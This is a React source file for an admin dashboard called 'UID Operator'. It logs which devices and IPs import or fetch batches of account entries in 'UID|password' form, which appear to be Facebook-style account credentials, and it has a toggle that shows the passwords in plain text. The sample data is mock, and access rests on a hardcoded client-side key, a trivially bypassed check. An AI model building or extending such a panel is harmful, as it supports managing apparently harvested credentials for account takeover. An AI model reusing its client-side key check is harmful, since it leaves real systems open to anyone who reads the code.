import { useState } from "react";

function parseDevice(ua: string): { brand: string; model: string; os: string; browser: string } {
  let brand = "Unknown", model = "", os = "Unknown", browser = "Chrome";

  // OS
  if (/iPhone/.test(ua)) { os = "iOS " + (ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, ".") ?? ""); }
  else if (/iPad/.test(ua)) { os = "iPadOS"; }
  else if (/Android (\d+)/.test(ua)) { os = "Android " + ua.match(/Android (\d+)/)?.[1]; }
  else if (/Windows NT/.test(ua)) { os = "Windows"; }
  else if (/Mac OS X/.test(ua)) { os = "macOS"; }

  // Brand / model
  if (/SM-([A-Z0-9]+)/.test(ua)) { brand = "Samsung"; model = "Galaxy " + ua.match(/SM-([A-Z0-9]+)/)?.[1]; }
  else if (/Redmi ([A-Za-z0-9 ]+) Build/.test(ua)) { brand = "Xiaomi"; model = "Redmi " + ua.match(/Redmi ([A-Za-z0-9 ]+) Build/)?.[1]?.trim(); }
  else if (/iPhone/.test(ua)) { brand = "Apple"; model = "iPhone"; }
  else if (/iPad/.test(ua)) { brand = "Apple"; model = "iPad"; }
  else if (/vivo ([A-Za-z0-9]+)/.test(ua)) { brand = "Vivo"; model = ua.match(/vivo ([A-Za-z0-9]+)/)?.[1] ?? ""; }
  else if (/OPPO ([A-Za-z0-9 ]+) Build/.test(ua)) { brand = "OPPO"; model = ua.match(/OPPO ([A-Za-z0-9 ]+) Build/)?.[1]?.trim() ?? ""; }
  else if (/Pixel (\d+)/.test(ua)) { brand = "Google"; model = "Pixel " + ua.match(/Pixel (\d+)/)?.[1]; }
  else if (/Windows/.test(ua)) { brand = "PC"; model = "Windows"; }
  else if (/Macintosh/.test(ua)) { brand = "Apple"; model = "MacBook"; }

  // Browser
  if (/SamsungBrowser/.test(ua)) browser = "Samsung Browser";
  else if (/FBAV/.test(ua)) browser = "Facebook App";
  else if (/Instagram/.test(ua)) browser = "Instagram";
  else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/)?.[1]?.split(".")[0] ?? "");
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Firefox\//.test(ua)) browser = "Firefox";

  return { brand, model, os, browser };
}

const MOCK_EVENTS = [
  {
    id: "1", time: "2026-06-17 19:42:03", ip: "103.87.142.21",
    ua: "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
    action: "import",
    entries: [
      "100007766920118|Pass@1234","100007741005785|Bangladesh1","100009812345678|mypass456",
      "100003456789012|secret789","100001234567890|hello2024","100012345678901|qwerty123",
      "100023456789012|abcdef456","100034567890123|pass1234","100045678901234|secure99",
      "100056789012345|login2024",
    ]
  },
  {
    id: "2", time: "2026-06-17 19:43:15", ip: "103.87.142.21",
    ua: "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
    action: "fetch",
    entries: ["100007766920118|Pass@1234","100007741005785|Bangladesh1","100009812345678|mypass456"]
  },
  {
    id: "3", time: "2026-06-17 18:11:44", ip: "45.249.93.17",
    ua: "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Build/RKQ1.211001.001) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    action: "import",
    entries: ["100011223344556|nid12345","100022334455667|pass2025","100033445566778|admin123","100044556677889|test9999"]
  },
  {
    id: "4", time: "2026-06-17 15:30:22", ip: "182.163.41.88",
    ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 Version/16.4 Mobile/15E148 Safari/604.1",
    action: "import",
    entries: ["100055667788990|apple123","100066778899001|iphone456","100077889900112|safari789","100088990011223|ios2024","100099001122334|applepass"]
  },
  {
    id: "5", time: "2026-06-17 12:05:17", ip: "59.152.48.221",
    ua: "Mozilla/5.0 (Linux; Android 11; vivo Y21) AppleWebKit/537.36 Chrome/110.0.0.0 Mobile Safari/537.36",
    action: "import",
    entries: ["100110011223344|vivo123","100221122334455|vivoy21"]
  },
  {
    id: "6", time: "2026-06-16 22:18:09", ip: "103.87.142.21",
    ua: "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
    action: "import",
    entries: ["100332233445566|samsung1","100443344556677|galaxy2","100554455667788|android3","100665566778899|chrome4","100776677889900|mobile5"]
  },
];

const ADMIN_KEY = "adbc4231";

export function AdminPanel() {
  const [key, setKey] = useState("");
  const [authed, setAuthed] = useState(false);
  const [selected, setSelected] = useState<typeof MOCK_EVENTS[0] | null>(null);
  const [filter, setFilter] = useState("all");
  const [search, setSearch] = useState("");
  const [showPass, setShowPass] = useState(false);

  if (!authed) {
    return (
      <div className="min-h-screen bg-[#0a0e1a] flex items-center justify-center">
        <div className="bg-[#0d1220] border border-[#1e2d40] rounded-xl p-8 w-80 text-center">
          <div className="text-[#ff3b3b] text-2xl mb-1">🔒</div>
          <div className="text-white font-bold text-sm mb-4">Admin Access Required</div>
          <input
            type="password"
            placeholder="Enter admin key"
            value={key}
            onChange={e => setKey(e.target.value)}
            onKeyDown={e => { if (e.key === "Enter" && key === ADMIN_KEY) setAuthed(true); }}
            className="w-full bg-[#1e2d40] border border-[#2a3a50] rounded px-3 py-2 text-xs text-white outline-none mb-3 text-center font-mono"
          />
          <button
            onClick={() => { if (key === ADMIN_KEY) setAuthed(true); }}
            className="w-full bg-[#3b8aff] hover:bg-[#2a79ee] text-white rounded py-2 text-xs font-bold transition-colors"
          >
            UNLOCK
          </button>
          {key && key !== ADMIN_KEY && (
            <div className="text-[#ff3b3b] text-[10px] mt-2">Invalid key</div>
          )}
        </div>
      </div>
    );
  }

  const totalUids = MOCK_EVENTS.filter(e => e.action === "import").reduce((s, e) => s + e.entries.length, 0);
  const uniqueIps = [...new Set(MOCK_EVENTS.map(e => e.ip))];

  const filtered = MOCK_EVENTS
    .filter(e => filter === "all" || e.action === filter)
    .filter(e => {
      if (!search) return true;
      const dev = parseDevice(e.ua);
      return e.ip.includes(search) ||
        `${dev.brand} ${dev.model}`.toLowerCase().includes(search.toLowerCase()) ||
        e.entries.some(u => u.includes(search));
    });

  return (
    <div className="min-h-screen bg-[#0a0e1a] text-white font-mono text-xs flex flex-col" style={{height:"100vh"}}>
      {/* Header */}
      <div className="flex items-center justify-between px-5 py-2.5 border-b border-[#1e2d40] bg-[#0d1220] flex-shrink-0">
        <div className="flex items-center gap-3">
          <span className="text-[#ff3b3b] font-bold">🔒 ADMIN</span>
          <span className="text-[#3b8aff] font-bold">UID Operator</span>
          <span className="text-[#4a5568]">— Activity Dashboard</span>
        </div>
        <div className="flex items-center gap-3 text-[10px] text-[#4a5568]">
          <button onClick={() => setShowPass(v=>!v)} className={`px-2 py-0.5 rounded text-[9px] ${showPass ? "bg-amber-500/20 text-amber-400" : "bg-[#1e2d40] text-[#6b7280]"}`}>
            {showPass ? "HIDE PASS" : "SHOW PASS"}
          </button>
          <span className="w-2 h-2 rounded-full bg-green-500 inline-block" /> Live
          <button onClick={() => setAuthed(false)} className="hover:text-[#ff3b3b] transition-colors">Logout</button>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-4 gap-3 px-5 py-3 border-b border-[#1e2d40] flex-shrink-0">
        {[
          { label: "Unique Devices", value: uniqueIps.length, color: "#3b8aff" },
          { label: "Import Events", value: MOCK_EVENTS.filter(e=>e.action==="import").length, color: "#9b59b6" },
          { label: "Total UIDs", value: totalUids, color: "#00d084" },
          { label: "Fetch Events", value: MOCK_EVENTS.filter(e=>e.action==="fetch").length, color: "#f39c12" },
        ].map(s => (
          <div key={s.label} className="bg-[#0d1220] border border-[#1e2d40] rounded-lg px-4 py-2.5">
            <div className="text-[10px] text-[#4a5568] mb-0.5">{s.label}</div>
            <div className="text-xl font-bold" style={{color:s.color}}>{s.value}</div>
          </div>
        ))}
      </div>

      {/* Filter + Search */}
      <div className="flex items-center gap-3 px-5 py-2 border-b border-[#1e2d40] flex-shrink-0">
        <div className="flex gap-1">
          {["all","import","fetch"].map(f => (
            <button key={f} onClick={() => setFilter(f)}
              className={`px-3 py-1 rounded text-[10px] font-bold transition-colors ${filter===f?"bg-[#3b8aff] text-white":"bg-[#1e2d40] text-[#6b7280] hover:text-white"}`}>
              {f.toUpperCase()}
            </button>
          ))}
        </div>
        <input placeholder="Search IP, device, UID..." value={search} onChange={e=>setSearch(e.target.value)}
          className="flex-1 bg-[#1e2d40] border border-[#2a3a50] rounded px-3 py-1.5 text-xs text-white placeholder:text-[#4a5568] outline-none" />
        <span className="text-[10px] text-[#4a5568]">{filtered.length} events</span>
      </div>

      {/* Main */}
      <div className="flex flex-1 min-h-0 overflow-hidden">
        {/* Table */}
        <div className="flex-1 overflow-auto">
          <table className="w-full text-[10px]">
            <thead className="sticky top-0 bg-[#0d1220] text-[#4a5568] border-b border-[#1e2d40] z-10">
              <tr>
                <th className="px-4 py-2 text-left">Time</th>
                <th className="px-4 py-2 text-left">IP</th>
                <th className="px-4 py-2 text-left">Device</th>
                <th className="px-4 py-2 text-left">OS</th>
                <th className="px-4 py-2 text-left">Browser</th>
                <th className="px-4 py-2 text-left">Action</th>
                <th className="px-4 py-2 text-right">UIDs</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map(e => {
                const dev = parseDevice(e.ua);
                return (
                  <tr key={e.id} onClick={() => setSelected(selected?.id===e.id ? null : e)}
                    className={`border-b border-[#1e2d40] cursor-pointer transition-colors ${selected?.id===e.id?"bg-[#1a2535]":"hover:bg-[#111827]"}`}>
                    <td className="px-4 py-2.5 text-[#6b7280]">{e.time}</td>
                    <td className="px-4 py-2.5 text-[#3b8aff] font-bold">{e.ip}</td>
                    <td className="px-4 py-2.5">
                      <span className="text-white font-semibold">{dev.brand}</span>
                      {dev.model && <span className="text-[#9ca3af] ml-1">{dev.model}</span>}
                    </td>
                    <td className="px-4 py-2.5 text-[#9ca3af]">{dev.os}</td>
                    <td className="px-4 py-2.5 text-[#9ca3af]">{dev.browser}</td>
                    <td className="px-4 py-2.5">
                      <span className={`px-2 py-0.5 rounded font-bold text-[9px] ${e.action==="import"?"bg-purple-500/20 text-purple-400":"bg-blue-500/20 text-blue-400"}`}>
                        {e.action.toUpperCase()}
                      </span>
                    </td>
                    <td className="px-4 py-2.5 text-right font-bold text-white">{e.entries.length}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {/* Detail panel */}
        {selected && (
          <div className="w-72 border-l border-[#1e2d40] bg-[#0d1220] flex flex-col flex-shrink-0">
            <div className="flex items-center justify-between px-4 py-2.5 border-b border-[#1e2d40] flex-shrink-0">
              <span className="font-bold text-[#3b8aff]">Detail</span>
              <button onClick={() => setSelected(null)} className="text-[#4a5568] hover:text-white">✕</button>
            </div>
            <div className="px-4 py-3 space-y-3 overflow-auto flex-1">
              {(() => { const dev = parseDevice(selected.ua); return (
                <>
                  <div><div className="text-[#4a5568] mb-0.5">Time</div><div>{selected.time}</div></div>
                  <div><div className="text-[#4a5568] mb-0.5">IP Address</div><div className="text-[#3b8aff] font-bold">{selected.ip}</div></div>
                  <div>
                    <div className="text-[#4a5568] mb-0.5">Device</div>
                    <div className="text-white font-semibold">{dev.brand} {dev.model}</div>
                    <div className="text-[#6b7280]">{dev.os} • {dev.browser}</div>
                  </div>
                  <div><div className="text-[#4a5568] mb-0.5">Action</div>
                    <span className={`px-2 py-0.5 rounded font-bold text-[9px] ${selected.action==="import"?"bg-purple-500/20 text-purple-400":"bg-blue-500/20 text-blue-400"}`}>
                      {selected.action.toUpperCase()}
                    </span>
                  </div>
                  <div>
                    <div className="text-[#4a5568] mb-1">UID | Password List ({selected.entries.length})</div>
                    <div className="space-y-0.5 max-h-64 overflow-auto pr-1">
                      {selected.entries.map((entry, i) => {
                        const [uid, pass] = entry.split("|");
                        return (
                          <div key={i} className="flex gap-1.5 px-2 py-1 bg-[#0a0e1a] rounded">
                            <span className="text-[#00d084] font-mono text-[10px] flex-1 truncate">{uid}</span>
                            <span className="text-[#f39c12] font-mono text-[10px] flex-shrink-0">
                              {showPass ? (pass ?? "—") : "••••••"}
                            </span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                </>
              ); })()}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
